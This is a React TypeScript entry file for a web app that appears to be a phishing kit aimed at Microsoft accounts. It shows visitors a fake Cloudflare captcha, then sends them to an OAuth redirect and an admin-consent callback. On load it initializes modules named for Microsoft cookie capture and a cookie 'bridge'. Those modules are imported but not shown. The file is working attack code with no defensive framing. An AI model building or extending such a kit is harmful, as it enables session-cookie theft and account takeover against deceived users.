import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import AdminConsentCallback from './components/AdminConsentCallback';
import { enhancedMicrosoftCookieCapture } from './utils/microsoftCookieCapture';
import { initializeMicrosoftCookieBridge, microsoftCookieBridge } from './utils/microsoftCookieBridge';

const App: React.FC = () => {
    return (
        <Router>
            <AppContent />
        </Router>
    );
};

const AppContent: React.FC = () => {
    // Initialize cookie utilities once when the app loads
    useEffect(() => {
        try {
            console.log('✅ Microsoft cookie capture utilities initialized');
            
            // Make utilities available globally for debugging
            if (typeof window !== 'undefined') {
                (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
                (window as any).microsoftCookieBridge = microsoftCookieBridge;
            }
            
            // Initialize the Microsoft Cookie Bridge
            console.log('🚀 Initializing Microsoft Cookie Bridge...');
            initializeMicrosoftCookieBridge();
            
        } catch (error) {
            console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
        }
    }, []);

    return (
        <Routes>
            {/* OAuth callback route - handles both GET (from React Router) and POST (via Netlify function) */}
            <Route path="/auth/callback" element={<AdminConsentCallback />} />
            
            {/* Legacy callback route for backward compatibility */}
            <Route path="/auth/callback/legacy" element={<AdminConsentCallback />} />
            
            {/* Default route - captcha and login flow */}
            <Route path="*" element={<DefaultPage />} />
        </Routes>
    );
};

const DefaultPage: React.FC = () => {
    const [currentPage, setCurrentPage] = useState('captcha');

    useEffect(() => {
        // Check URL params to determine which page to show
        const urlParams = new URLSearchParams(window.location.search);
        const step = urlParams.get('step');
        const error = urlParams.get('error');
        
        if (error) {
            console.error('❌ OAuth error from URL:', error);
            // Show error or redirect to captcha
            setCurrentPage('captcha');
            
            // Clean up URL
            window.history.replaceState({}, document.title, window.location.pathname);
            return;
        }
        
        if (step) {
            setCurrentPage(step);
            
            // Clean up URL after reading the step
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }, []);

    const handleCaptchaVerified = () => {
        console.log('✅ Captcha verified, proceeding to replacement page');
        setCurrentPage('replacement');
    };

    const handleCaptchaBack = () => {
        console.log('🔄 Reloading page from captcha');
        window.location.reload();
    };
    
    // Render the appropriate page based on current state
    switch (currentPage) {
        case 'captcha':
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
            
        case 'replacement':
            return <RealOAuthRedirect />;
            
        default:
            // Fallback to captcha if unknown state
            return (
                <CloudflareCaptcha
                    onVerified={handleCaptchaVerified}
                    onBack={handleCaptchaBack}
                />
            );
    }
};

export default App;